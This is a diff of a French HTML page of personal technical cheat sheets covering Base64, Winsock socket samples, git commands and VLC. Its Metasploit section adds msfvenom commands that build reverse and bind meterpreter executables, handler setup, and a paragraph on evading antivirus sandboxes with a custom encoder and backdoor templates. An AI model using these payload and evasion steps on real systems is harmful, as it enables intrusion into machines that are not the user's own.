@@ -4,12 +4,69 @@
   <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
   <meta http-equiv="Content-Style-Type" content="text/css" />
   <meta name="generator" content="pandoc" />
-  <title></title>
+  <meta name="author" content="Poulpy, Plopi42" />
+  <meta name="date" content="2012-10-14" />
+  <title>Technical cheat sheets</title>
+  <style type="text/css">
+table.sourceCode, tr.sourceCode, td.lineNumbers, td.sourceCode {
+  margin: 0; padding: 0; vertical-align: baseline; border: none; }
+table.sourceCode { width: 100%; background-color: #f8f8f8; }
+td.lineNumbers { text-align: right; padding-right: 4px; padding-left: 4px; color: #aaaaaa; border-right: 1px solid #aaaaaa; }
+td.sourceCode { padding-left: 5px; }
+pre, code { background-color: #f8f8f8; }
+code > span.kw { color: #204a87; font-weight: bold; }
+code > span.dt { color: #204a87; }
+code > span.dv { color: #0000cf; }
+code > span.bn { color: #0000cf; }
+code > span.fl { color: #0000cf; }
+code > span.ch { color: #4e9a06; }
+code > span.st { color: #4e9a06; }
+code > span.co { color: #8f5902; font-style: italic; }
+code > span.ot { color: #8f5902; }
+code > span.al { color: #ef2929; }
+code > span.fu { color: #000000; }
+code > span.er { font-weight: bold; }
+  </style>
   <link rel="stylesheet" href="extra/pandoc.css" type="text/css" />
 </head>
 <body>
+<div id="header">
+<h1 class="title">Technical cheat sheets</h1>
+<h2 class="author">Poulpy, Plopi42</h2>
+<h3 class="date">2012-10-14</h3>
+</div>
 <div id="TOC">
 <ul>
+<li><a href="#cryptographie-et-encodage">Cryptographie et Encodage</a><ul>
+<li><a href="#base-64">Base 64</a><ul>
+<li><a href="#description">Description</a></li>
+<li><a href="#tables-de-conversion">Tables de conversion</a><ul>
+<li><a href="#table-de-conversion-base-64-standard">Table de conversion base 64 standard</a></li>
+<li><a href="#table-de-conversion-base-64-pour-les-url">Table de conversion base 64 pour les URL</a></li>
+</ul></li>
+<li><a href="#exemples">Exemples</a><ul>
+<li><a href="#exemple-détaillé">Exemple détaillé</a></li>
+<li><a href="#autres-exemples">Autres exemples</a></li>
+</ul></li>
+</ul></li>
+</ul></li>
+<li><a href="#devlopment">Devlopment</a><ul>
+<li><a href="#windows">Windows</a><ul>
+<li><a href="#socket-windows-en-c-c">Socket Windows en C / C++</a><ul>
+<li><a href="#client">Client</a></li>
+<li><a href="#serveur">Serveur</a></li>
+</ul></li>
+</ul></li>
+</ul></li>
+<li><a href="#linux">Linux</a><ul>
+<li><a href="#linux-utils">Linux utils</a><ul>
+<li><a href="#affichage-de-ladresse-ip">Affichage de l’adresse IP</a><ul>
+<li><a href="#utilisation">Utilisation</a></li>
+<li><a href="#instalation">Instalation</a></li>
+</ul></li>
+</ul></li>
+</ul></li>
+<li><a href="#tools">Tools</a><ul>
 <li><a href="#git">GIT</a><ul>
 <li><a href="#ressources">Ressources</a><ul>
 <li><a href="#fichier-de-configuration-.gitconfig">Fichier de configuration .gitconfig</a></li>
@@ -29,15 +86,18 @@
 </ul></li>
 </ul></li>
 <li><a href="#metasploit">Metasploit</a><ul>
-<li><a href="#genration-de-payload-executables">Genration de payload executables</a><ul>
+<li><a href="#genération-de-payload-exécutables">Genération de payload exécutables</a><ul>
 <li><a href="#manuel">Manuel</a></li>
 <li><a href="#exemple">Exemple</a><ul>
 <li><a href="#lister-les-options-dun-payload">Lister les options d’un payload</a></li>
 <li><a href="#créer-un-payload-meterpreter-pour-windows">Créer un payload meterpreter pour windows</a></li>
+<li><a href="#créer-un-payload-meterpreter-pour-linux">Créer un payload meterpreter pour Linux</a></li>
 </ul></li>
 <li><a href="#alternative">Alternative</a></li>
 </ul></li>
 <li><a href="#lancement-de-handler">Lancement de handler</a></li>
+<li><a href="#exploitation-depuis-msfconsole">Exploitation depuis msfconsole</a></li>
+<li><a href="#contournement-des-antivirus">Contournement des antivirus</a></li>
 </ul></li>
 <li><a href="#vlc">VLC</a><ul>
 <li><a href="#transcoding">Transcoding</a><ul>
@@ -48,13 +108,330 @@
 <li><a href="#net-casting-http">Net casting http</a></li>
 <li><a href="#devices">Devices</a></li>
 </ul></li>
+</ul></li>
+<li><a href="#windows-1">Windows</a><ul>
+<li><a href="#ligne-de-commande-windows">Ligne de commande Windows</a><ul>
+<li><a href="#gestion-des-utilisateurs">Gestion des utilisateurs</a><ul>
+<li><a href="#activation-dun-utilisateur">activation d’un utilisateur</a></li>
+<li><a href="#désactivation-dun-utilisateur">désactivation d’un utilisateur</a></li>
+</ul></li>
+<li><a href="#gestion-des-services">Gestion des services</a></li>
+<li><a href="#gestion-des-fichiers">Gestion des fichiers</a></li>
+<li><a href="#commandes-utiles">Commandes utiles</a></li>
+</ul></li>
+</ul></li>
 </ul>
 </div>
-<h1 id="git"><a href="#TOC">GIT</a></h1>
-<h2 id="ressources"><a href="#TOC">Ressources</a></h2>
-<h3 id="fichier-de-configuration-.gitconfig"><a href="#TOC">Fichier de configuration .gitconfig</a></h3>
-<p>Ce fichier permet de paramétrer git, notamment pour préciser les variables d’environnement et les alias de commandes. <a href="../ressources/.gitconfig">Voir dans les ressources</a></p>
-<h3 id="fichier-de-configuration-.gitignore"><a href="#TOC">Fichier de configuration .gitignore</a></h3>
+<h1 id="cryptographie-et-encodage"><a href="#TOC">Cryptographie et Encodage</a></h1>
+<h2 id="base-64"><a href="#TOC">Base 64</a></h2>
+<h3 id="description"><a href="#TOC">Description</a></h3>
+<p>La base 64 est un encodage de données utilisant 64 caractères standards et un caractère de complément ‘=’ utilisé comme bourage. Il est utilisé dans les messages électroniques (SMTP, POP, IMAP …) et dans les pages WEB. Il permet la transmission de tout type de données (images, vidéos, doc …) en mode texte. Il est défini en tant que codage MIME.</p>
+<p>Le résultat est plus important que la taille d’origine : 3octets = 4octets encodés.</p>
+<h3 id="tables-de-conversion"><a href="#TOC">Tables de conversion</a></h3>
+<h4 id="table-de-conversion-base-64-standard"><a href="#TOC">Table de conversion base 64 standard</a></h4>
+<div class="figure">
+<img src="../ressources/Cryptographie_et_Encodage/Base64/Base64-regular.png" title="Table de conversion base 64 standard" alt="Table de conversion base 64 standard" /><p class="caption">Table de conversion base 64 standard</p>
+</div>
+<h4 id="table-de-conversion-base-64-pour-les-url"><a href="#TOC">Table de conversion base 64 pour les URL</a></h4>
+<div class="figure">
+<img src="../ressources/Cryptographie_et_Encodage/Base64/Base64-url.png" title="Table de conversion base 64 pour les URL" alt="Table de conversion base 64 pour les URL" /><p class="caption">Table de conversion base 64 pour les URL</p>
+</div>
+<h3 id="exemples"><a href="#TOC">Exemples</a></h3>
+<h4 id="exemple-détaillé"><a href="#TOC">Exemple détaillé</a></h4>
+<div class="figure">
+<img src="../ressources/Cryptographie_et_Encodage/Base64/Base64-exemple.png" title="Exemple détaillé" alt="Exemple détaillé" /><p class="caption">Exemple détaillé</p>
+</div>
+<h4 id="autres-exemples"><a href="#TOC">Autres exemples</a></h4>
+<pre><code>$ echo -n &#39;A&#39; | base64
+QQ==</code></pre>
+<pre><code>$ echo -n &#39;AB&#39; | base64
+QUI=</code></pre>
+<pre><code>$ echo -n &#39;ABC&#39; | base64
+QUJD</code></pre>
+<pre><code>$ echo -n &#39;ABCA&#39; | base64
+QUJDQQ==</code></pre>
+<h1 id="devlopment"><a href="#TOC">Devlopment</a></h1>
+<h2 id="windows"><a href="#TOC">Windows</a></h2>
+<h3 id="socket-windows-en-c-c"><a href="#TOC">Socket Windows en C / C++</a></h3>
+<h4 id="client"><a href="#TOC">Client</a></h4>
+<pre class="sourceCode C"><code class="sourceCode c"><span class="ot">#define WIN32_LEAN_AND_MEAN</span>
+
+<span class="ot">#include &lt;windows.h&gt;</span>
+<span class="ot">#include &lt;winsock2.h&gt;</span>
+<span class="ot">#include &lt;ws2tcpip.h&gt;</span>
+<span class="ot">#include &lt;stdlib.h&gt;</span>
+<span class="ot">#include &lt;stdio.h&gt;</span>
+
+
+<span class="co">// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib</span>
+<span class="ot">#pragma comment (lib, &quot;Ws2_32.lib&quot;)</span>
+<span class="ot">#pragma comment (lib, &quot;Mswsock.lib&quot;)</span>
+<span class="ot">#pragma comment (lib, &quot;AdvApi32.lib&quot;)</span>
+
+
+<span class="ot">#define DEFAULT_BUFLEN 512</span>
+<span class="ot">#define DEFAULT_PORT &quot;27015&quot;</span>
+
+<span class="dt">int</span> __cdecl main(<span class="dt">int</span> argc, <span class="dt">char</span> **argv) 
+{
+    WSADATA wsaData;
+    SOCKET ConnectSocket = INVALID_SOCKET;
+    <span class="kw">struct</span> addrinfo *result = NULL,
+                    *ptr = NULL,
+                    hints;
+    <span class="dt">char</span> *sendbuf = <span class="st">&quot;this is a test&quot;</span>;
+    <span class="dt">char</span> recvbuf[DEFAULT_BUFLEN];
+    <span class="dt">int</span> iResult;
+    <span class="dt">int</span> recvbuflen = DEFAULT_BUFLEN;
+
+    <span class="co">// Validate the parameters</span>
+    <span class="kw">if</span> (argc != <span class="dv">2</span>) {
+        printf(<span class="st">&quot;usage: %s server-name</span><span class="ch">\n</span><span class="st">&quot;</span>, argv[<span class="dv">0</span>]);
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Initialize Winsock</span>
+    iResult = WSAStartup(MAKEWORD(<span class="dv">2</span>,<span class="dv">2</span>), &amp;wsaData);
+    <span class="kw">if</span> (iResult != <span class="dv">0</span>) {
+        printf(<span class="st">&quot;WSAStartup failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    ZeroMemory( &amp;hints, <span class="kw">sizeof</span>(hints) );
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    <span class="co">// Resolve the server address and port</span>
+    iResult = getaddrinfo(argv[<span class="dv">1</span>], DEFAULT_PORT, &amp;hints, &amp;result);
+    <span class="kw">if</span> ( iResult != <span class="dv">0</span> ) {
+        printf(<span class="st">&quot;getaddrinfo failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Attempt to connect to an address until one succeeds</span>
+    <span class="kw">for</span>(ptr=result; ptr != NULL ;ptr=ptr-&gt;ai_next) {
+
+        <span class="co">// Create a SOCKET for connecting to server</span>
+        ConnectSocket = socket(ptr-&gt;ai_family, ptr-&gt;ai_socktype, 
+            ptr-&gt;ai_protocol);
+        <span class="kw">if</span> (ConnectSocket == INVALID_SOCKET) {
+            printf(<span class="st">&quot;socket failed with error: %ld</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+            WSACleanup();
+            <span class="kw">return</span> <span class="dv">1</span>;
+        }
+
+        <span class="co">// Connect to server.</span>
+        iResult = connect( ConnectSocket, ptr-&gt;ai_addr, (<span class="dt">int</span>)ptr-&gt;ai_addrlen);
+        <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+            closesocket(ConnectSocket);
+            ConnectSocket = INVALID_SOCKET;
+            <span class="kw">continue</span>;
+        }
+        <span class="kw">break</span>;
+    }
+
+    freeaddrinfo(result);
+
+    <span class="kw">if</span> (ConnectSocket == INVALID_SOCKET) {
+        printf(<span class="st">&quot;Unable to connect to server!</span><span class="ch">\n</span><span class="st">&quot;</span>);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Send an initial buffer</span>
+    iResult = send( ConnectSocket, sendbuf, (<span class="dt">int</span>)strlen(sendbuf), <span class="dv">0</span> );
+    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+        printf(<span class="st">&quot;send failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        closesocket(ConnectSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    printf(<span class="st">&quot;Bytes Sent: %ld</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+
+    <span class="co">// shutdown the connection since no more data will be sent</span>
+    iResult = shutdown(ConnectSocket, SD_SEND);
+    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+        printf(<span class="st">&quot;shutdown failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        closesocket(ConnectSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Receive until the peer closes the connection</span>
+    <span class="kw">do</span> {
+
+        iResult = recv(ConnectSocket, recvbuf, recvbuflen, <span class="dv">0</span>);
+        <span class="kw">if</span> ( iResult &gt; <span class="dv">0</span> )
+            printf(<span class="st">&quot;Bytes received: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+        <span class="kw">else</span> <span class="kw">if</span> ( iResult == <span class="dv">0</span> )
+            printf(<span class="st">&quot;Connection closed</span><span class="ch">\n</span><span class="st">&quot;</span>);
+        <span class="kw">else</span>
+            printf(<span class="st">&quot;recv failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+
+    } <span class="kw">while</span>( iResult &gt; <span class="dv">0</span> );
+
+    <span class="co">// cleanup</span>
+    closesocket(ConnectSocket);
+    WSACleanup();
+
+    <span class="kw">return</span> <span class="dv">0</span>;
+}</code></pre>
+<h4 id="serveur"><a href="#TOC">Serveur</a></h4>
+<pre class="sourceCode C"><code class="sourceCode c">
+<span class="ot">#define WIN32_LEAN_AND_MEAN</span>
+
+<span class="ot">#undef UNICODE</span>
+
+
+<span class="ot">#include &lt;windows.h&gt;</span>
+<span class="ot">#include &lt;winsock2.h&gt;</span>
+<span class="ot">#include &lt;ws2tcpip.h&gt;</span>
+<span class="ot">#include &lt;stdlib.h&gt;</span>
+<span class="ot">#include &lt;stdio.h&gt;</span>
+
+<span class="co">// Need to link with Ws2_32.lib</span>
+<span class="ot">#pragma comment (lib, &quot;Ws2_32.lib&quot;)</span>
+<span class="co">// #pragma comment (lib, &quot;Mswsock.lib&quot;)</span>
+
+<span class="ot">#define DEFAULT_BUFLEN 512</span>
+<span class="ot">#define DEFAULT_PORT &quot;27015&quot;</span>
+
+<span class="dt">int</span> __cdecl main(<span class="dt">void</span>) 
+{
+    WSADATA wsaData;
+    <span class="dt">int</span> iResult;
+
+    SOCKET ListenSocket = INVALID_SOCKET;
+    SOCKET ClientSocket = INVALID_SOCKET;
+
+    <span class="kw">struct</span> addrinfo *result = NULL;
+    <span class="kw">struct</span> addrinfo hints;
+
+    <span class="dt">int</span> iSendResult;
+    <span class="dt">char</span> recvbuf[DEFAULT_BUFLEN];
+    <span class="dt">int</span> recvbuflen = DEFAULT_BUFLEN;
+
+    <span class="co">// Initialize Winsock</span>
+    iResult = WSAStartup(MAKEWORD(<span class="dv">2</span>,<span class="dv">2</span>), &amp;wsaData);
+    <span class="kw">if</span> (iResult != <span class="dv">0</span>) {
+        printf(<span class="st">&quot;WSAStartup failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    ZeroMemory(&amp;hints, <span class="kw">sizeof</span>(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+    hints.ai_flags = AI_PASSIVE;
+
+    <span class="co">// Resolve the server address and port</span>
+    iResult = getaddrinfo(NULL, DEFAULT_PORT, &amp;hints, &amp;result);
+    <span class="kw">if</span> ( iResult != <span class="dv">0</span> ) {
+        printf(<span class="st">&quot;getaddrinfo failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Create a SOCKET for connecting to server</span>
+    ListenSocket = socket(result-&gt;ai_family, result-&gt;ai_socktype, result-&gt;ai_protocol);
+    <span class="kw">if</span> (ListenSocket == INVALID_SOCKET) {
+        printf(<span class="st">&quot;socket failed with error: %ld</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        freeaddrinfo(result);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Setup the TCP listening socket</span>
+    iResult = bind( ListenSocket, result-&gt;ai_addr, (<span class="dt">int</span>)result-&gt;ai_addrlen);
+    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+        printf(<span class="st">&quot;bind failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        freeaddrinfo(result);
+        closesocket(ListenSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    freeaddrinfo(result);
+
+    iResult = listen(ListenSocket, SOMAXCONN);
+    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+        printf(<span class="st">&quot;listen failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        closesocket(ListenSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Accept a client socket</span>
+    ClientSocket = accept(ListenSocket, NULL, NULL);
+    <span class="kw">if</span> (ClientSocket == INVALID_SOCKET) {
+        printf(<span class="st">&quot;accept failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        closesocket(ListenSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// No longer need server socket</span>
+    closesocket(ListenSocket);
+
+    <span class="co">// Receive until the peer shuts down the connection</span>
+    <span class="kw">do</span> {
+
+        iResult = recv(ClientSocket, recvbuf, recvbuflen, <span class="dv">0</span>);
+        <span class="kw">if</span> (iResult &gt; <span class="dv">0</span>) {
+            printf(<span class="st">&quot;Bytes received: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+
+        <span class="co">// Echo the buffer back to the sender</span>
+            iSendResult = send( ClientSocket, recvbuf, iResult, <span class="dv">0</span> );
+            <span class="kw">if</span> (iSendResult == SOCKET_ERROR) {
+                printf(<span class="st">&quot;send failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+                closesocket(ClientSocket);
+                WSACleanup();
+                <span class="kw">return</span> <span class="dv">1</span>;
+            }
+            printf(<span class="st">&quot;Bytes sent: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iSendResult);
+        }
+        <span class="kw">else</span> <span class="kw">if</span> (iResult == <span class="dv">0</span>)
+            printf(<span class="st">&quot;Connection closing...</span><span class="ch">\n</span><span class="st">&quot;</span>);
+        <span class="kw">else</span>  {
+            printf(<span class="st">&quot;recv failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+            closesocket(ClientSocket);
+            WSACleanup();
+            <span class="kw">return</span> <span class="dv">1</span>;
+        }
+
+    } <span class="kw">while</span> (iResult &gt; <span class="dv">0</span>);
+
+    <span class="co">// shutdown the connection since we&#39;re done</span>
+    iResult = shutdown(ClientSocket, SD_SEND);
+    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+        printf(<span class="st">&quot;shutdown failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        closesocket(ClientSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// cleanup</span>
+    closesocket(ClientSocket);
+    WSACleanup();
+
+    <span class="kw">return</span> <span class="dv">0</span>;
+}</code></pre>
+<h1 id="linux"><a href="#TOC">Linux</a></h1>
+<h2 id="linux-utils"><a href="#TOC">Linux utils</a></h2>
+<h3 id="affichage-de-ladresse-ip"><a href="#TOC">Affichage de l’adresse IP</a></h3>
+<h4 id="utilisation"><a href="#TOC">Utilisation</a></h4>
+<pre><code>ifdata -pa eth0</code></pre>
+<h4 id="instalation"><a href="#TOC">Instalation</a></h4>
+<pre><code>apt-get install moreutils</code></pre>
+<h1 id="tools"><a href="#TOC">Tools</a></h1>
+<h2 id="git"><a href="#TOC">GIT</a></h2>
+<h3 id="ressources"><a href="#TOC">Ressources</a></h3>
+<h4 id="fichier-de-configuration-.gitconfig"><a href="#TOC">Fichier de configuration .gitconfig</a></h4>
+<p>Ce fichier permet de paramétrer git, notamment pour préciser les variables d’environnement et les alias de commandes. Voir <a href="../ressources/Tools/GIT/.gitconfig">l’exemple</a>.</p>
+<h4 id="fichier-de-configuration-.gitignore"><a href="#TOC">Fichier de configuration .gitignore</a></h4>
 <p>Ce fichier permet de préciser les fichiers qui doivent être ignorés par Git. Pour ce faire, il doit être mentionné dans le .gitconfig comme suit :</p>
 <pre><code>[core]
     excludesfile = /home/&lt;username&gt;/.gitignore</code></pre>
@@ -64,7 +441,7 @@ _inst*
 *.o
 *~
 Thumbs.db</code></pre>
-<h3 id="script-dajout-didentité"><a href="#TOC">Script d’ajout d’identité</a></h3>
+<h4 id="script-dajout-didentité"><a href="#TOC">Script d’ajout d’identité</a></h4>
 <p>Ce script a pour but de ne plus avoir à saisir le mot de passe de sa clé privé à chaque connexion. /!\ L’utilisation de ce script nuit à votre sécurité.</p>
 <p>Voici le fichier :</p>
 <pre><code>var=`ssh-agent -s`
@@ -73,23 +450,23 @@ ssh-add ~/.ssh/id_dsa ~/.ssh/id_rsa
 unset var</code></pre>
 <p>Pour l’utiliser, il faut le sourcer comme suit ou l’intégrer à votre .bashrc :</p>
 <pre><code>. ~/.ssh-add-identity</code></pre>
-<h2 id="useful-commands"><a href="#TOC">Useful commands</a></h2>
-<h3 id="change-log-information"><a href="#TOC">Change log information</a></h3>
+<h3 id="useful-commands"><a href="#TOC">Useful commands</a></h3>
+<h4 id="change-log-information"><a href="#TOC">Change log information</a></h4>
 <pre><code>git filter-branch -f --env-filter &quot;GIT_AUTHOR_NAME=&#39;Newname&#39;; GIT_AUTHOR_EMAIL=&#39;newemail&#39;; GIT_COMMITTER_NAME=&#39;Newname&#39;; GIT_COMMITTER_EMAIL=&#39;newemail&#39;;&quot; HEAD</code></pre>
-<h3 id="récupérer-les-modifications-présentes-sur-le-serveur"><a href="#TOC">Récupérer les modifications présentes sur le serveur</a></h3>
+<h4 id="récupérer-les-modifications-présentes-sur-le-serveur"><a href="#TOC">Récupérer les modifications présentes sur le serveur</a></h4>
 <pre><code>git fetch
 git rebase origin/&lt;Nom de la branche par rapport à qui se mettre à jour&gt;
 #exemple :
 git rebase origin/master</code></pre>
-<h3 id="mettre-à-jour-le-dépôt-local-par-rapport-au-dépôt-distant"><a href="#TOC">Mettre à jour le dépôt local par rapport au dépôt distant</a></h3>
+<h4 id="mettre-à-jour-le-dépôt-local-par-rapport-au-dépôt-distant"><a href="#TOC">Mettre à jour le dépôt local par rapport au dépôt distant</a></h4>
 <pre><code>git fra</code></pre>
-<h3 id="faire-un-commit-local"><a href="#TOC">Faire un commit local</a></h3>
+<h4 id="faire-un-commit-local"><a href="#TOC">Faire un commit local</a></h4>
 <pre><code>git status  # voir le status des fichiers
 git add &lt;Nouveaux fichiers&gt;
 git commit -m &#39;&lt;Message de commit&gt;&#39;</code></pre>
-<h3 id="pousser-les-modifications-sur-le-serveur"><a href="#TOC">Pousser les modifications sur le serveur</a></h3>
+<h4 id="pousser-les-modifications-sur-le-serveur"><a href="#TOC">Pousser les modifications sur le serveur</a></h4>
 <pre><code>git push</code></pre>
-<h3 id="créer-une-branche-sur-un-serveur-remote"><a href="#TOC">Créer une branche sur un serveur (remote)</a></h3>
+<h4 id="créer-une-branche-sur-un-serveur-remote"><a href="#TOC">Créer une branche sur un serveur (remote)</a></h4>
 <pre><code> git push origin master:refs/heads/testing
  git cob testing          
  echo chiche_branch &gt; test
@@ -99,7 +476,7 @@ git commit -m &#39;&lt;Message de commit&gt;&#39;</code></pre>
  git push origin testing    # Vous précisez la branche testing à pusher dans origin (le serveur)</code></pre>
 <p>ou bien</p>
 <pre><code>git push origin master:refs/heads/testing     # will create the branch staging in the origin repository by copying the local master branch</code></pre>
-<h3 id="merger-2-branches"><a href="#TOC">Merger 2 branches</a></h3>
+<h4 id="merger-2-branches"><a href="#TOC">Merger 2 branches</a></h4>
 <pre><code>git br crazy_idea
 git br
     experimental
@@ -109,16 +486,16 @@ git co crazy_idea
 git merge experimental       # merge experimental dans crazy_idea
                              # Si il ya des conflits =&gt; git diff et git status montreront les problemes
  git commit -a               # commit all changes</code></pre>
-<h3 id="supprimer-une-branche-locale"><a href="#TOC">Supprimer une branche locale</a></h3>
+<h4 id="supprimer-une-branche-locale"><a href="#TOC">Supprimer une branche locale</a></h4>
 <pre><code> git branch -d experimental          #Cette commande s&#39;assure que les changement de la branche &#39;experimental&#39; 
                                      #  se trouve dans la branche courante.
  git branch -D crazy_idea            # Si vous développez une idée folle, puis le regrettez, vous pouvez 
                                      #  toujours effacer cette branche avec -D</code></pre>
-<h3 id="delete-a-remote-branch"><a href="#TOC">Delete a Remote Branch</a></h3>
+<h4 id="delete-a-remote-branch"><a href="#TOC">Delete a Remote Branch</a></h4>
 <pre><code>git push origin :testing                      #will delete the branch staging from the origin repository.</code></pre>
-<h1 id="metasploit"><a href="#TOC">Metasploit</a></h1>
-<h2 id="genration-de-payload-executables"><a href="#TOC">Genration de payload executables</a></h2>
-<h3 id="manuel"><a href="#TOC">Manuel</a></h3>
+<h2 id="metasploit"><a href="#TOC">Metasploit</a></h2>
+<h3 id="genération-de-payload-exécutables"><a href="#TOC">Genération de payload exécutables</a></h3>
+<h4 id="manuel"><a href="#TOC">Manuel</a></h4>
 <pre><code># msfvenom -h
 Usage: /opt/framework/msf3/msfvenom [options] 
 
@@ -137,50 +514,52 @@ Options:
     -x, --template   [path]          Specify a custom executable file to use as a template
     -k, --keep                       Preserve the template behavior and inject the payload as a new thread
     -h, --help                       Show this message</code></pre>
-<h3 id="exemple"><a href="#TOC">Exemple</a></h3>
-<h4 id="lister-les-options-dun-payload"><a href="#TOC">Lister les options d’un payload</a></h4>
+<h4 id="exemple"><a href="#TOC">Exemple</a></h4>
+<h5 id="lister-les-options-dun-payload"><a href="#TOC">Lister les options d’un payload</a></h5>
 <pre><code># msfvenom -p windows/meterpreter/reverse_tcp -o</code></pre>
-<h4 id="créer-un-payload-meterpreter-pour-windows"><a href="#TOC">Créer un payload meterpreter pour windows</a></h4>
+<h5 id="créer-un-payload-meterpreter-pour-windows"><a href="#TOC">Créer un payload meterpreter pour windows</a></h5>
 <pre><code># msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=$(ifdata -pa eth0) LPORT=5555 &gt; windobReverseMeterpreter5555.exe</code></pre>
-<h3 id="alternative"><a href="#TOC">Alternative</a></h3>
+<h5 id="créer-un-payload-meterpreter-pour-linux"><a href="#TOC">Créer un payload meterpreter pour Linux</a></h5>
+<pre><code># msfvenom -p linux/x86/meterpreter/bind_tcp -f elf LPORT=5555 &gt; linuxMeterpreter5555.bin</code></pre>
+<h4 id="alternative"><a href="#TOC">Alternative</a></h4>
 <pre><code># msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 X &gt; met-reverse.exe</code></pre>
-<h2 id="lancement-de-handler"><a href="#TOC">Lancement de handler</a></h2>
-<pre><code># msfcli multi/handler LPORT=5555 E
-
-
-use payload/linux/x86/meterpreter/bind_tcp
-
-use payload/windows/meterpreter/bind_tcp
+<h3 id="lancement-de-handler"><a href="#TOC">Lancement de handler</a></h3>
+<pre><code># msfcli multi/handler LPORT=5555 E</code></pre>
+<h3 id="exploitation-depuis-msfconsole"><a href="#TOC">Exploitation depuis msfconsole</a></h3>
+<p>Cette méthode evite de charger deux fois le gros de metasploit.</p>
+<pre><code>use payload/windows/meterpreter/bind_tcp
 set LPORT 8888
 show options
 generate -t exe -f /root/meterpreter6666.exe
-exploit
-
+back
 
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/bind_tcp
 set RHOST 192.168.0.1
 set LPORT 8888
 exploit</code></pre>
-<p><a href="https://github.com/MrTchuss/Metasploit-stuff/tree/master/tools">https://github.com/MrTchuss/Metasploit-stuff/tree/master/tools</a></p>
-<h1 id="vlc"><a href="#TOC">VLC</a></h1>
-<h2 id="transcoding"><a href="#TOC">Transcoding</a></h2>
-<h3 id="vers-mp4"><a href="#TOC">vers MP4</a></h3>
+<h3 id="contournement-des-antivirus"><a href="#TOC">Contournement des antivirus</a></h3>
+<p>Certains virus utilisent des sandboxes pour lancer les exécutables et vérifier leur dangerosité. (Mal)heureusement, ces sandboxes implémentent rarement les communication réseaux, pour des raisons de sécurités.</p>
+<p>Il est donc possible de cacher un payload malveillant en vérifiant la possibilité d’effectuer une connexion réseau. En utilisant le template <a href="../ressources/Tools/metasploit/meterpreterTemplate1.zip">ci-joint</a> et l’encoder metasploit <a href="../ressources/Tools/metasploit/xorbyte.rb">ci-joint</a> à placer dans modules/encoders/x86/xorbyte.rb.</p>
+<p>Pour une backdoor plus permanente, en bind tcp, il est possible d’utiliser le template <a href="../ressources/Tools/metasploit/meterpreterTemplate2.zip">ci-joint</a>.</p>
+<h2 id="vlc"><a href="#TOC">VLC</a></h2>
+<h3 id="transcoding"><a href="#TOC">Transcoding</a></h3>
+<h4 id="vers-mp4"><a href="#TOC">vers MP4</a></h4>
 <pre><code>&quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp :sout=&quot;#transcode{vcodec=mp4v,vb=1800,fps=25 acodec=mpga,ab=192,scale=1,channels=2}:standard{access=file,mux=avi,dst=&#39;output.avi&#39;}&quot; 
